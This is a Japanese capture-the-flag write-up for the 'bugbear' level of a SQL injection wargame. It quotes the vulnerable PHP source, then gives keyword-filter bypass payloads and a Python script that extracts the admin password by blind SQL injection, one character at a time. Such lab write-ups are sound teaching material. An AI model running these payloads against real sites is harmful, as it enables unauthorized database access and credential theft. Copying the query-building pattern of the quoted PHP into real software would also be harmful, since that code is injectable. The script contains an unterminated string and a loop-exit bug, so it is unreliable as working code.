# bugbear

## answer

- [bugbear](../src/bugbear.py)

## problem

```
query : select id from prob_bugbear where id='guest' and pw='' and no=

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no=1&pw=1
```

とすると

```
query : select id from prob_bugbear where id='guest' and pw='1' and no=1
```

となった。

```
if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe");
```

GETパラメータ noのフィルターは、=、like、0x、asciiなども禁じている。

```
?no=1/**/||1/**/&pw=1
```

これを試すと、

```
Hello guest
```

となる。

次は「Hello admin」を出したい。
「= "admin"」「like  "admin"」は「in ("admin")」で代替して（ちなみに、&&は「%26%26」）

```
?no=1/**/||/**/id/**/in/**/("admin")/**/%26%26/**/LEFT(pw,1)/**/</**/"A"
```

で、```Hello admin```とでるので、BlindSQLiということがわかった。

```
?no=1/**/||/**/id/**/in/**/("admin")/**/%26%26/**/LEFT(pw,1)/**/</**/"0"

?no=1/**/||/**/id/**/in/**/("admin")/**/%26%26/**/LEFT(pw,1)/**/</**/"A"
```

↑ちなみに、これだと下のみHello admin

```
?no=1||id/**/in/**/("admin")%26%26MID(pw,1,1)/**/in/**/("7")
```

おっと、これが通る。

それじゃ、コード書いていくぜ。

```
#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"
    ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
    headers = {'User-Agent': ua}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXX)

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = ""
    for count in range(1, 11):
        for char in chars:
            val = '1||id/**/in/**/(\"admin\")&&MID(pw,{count},1)/**/in/**/(\"{char}\")'.format(count = count, char = char)
            params = {'no': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                print(password)
                break
            if char == 'z':
                print("not found")
                print(password)
                return
            time.sleep(0.1)
    print(password)

if __name__ == "__main__":
    main()
```

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [addslashes | php manual](https://www.php.net/manual/ja/function.addslashes.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)
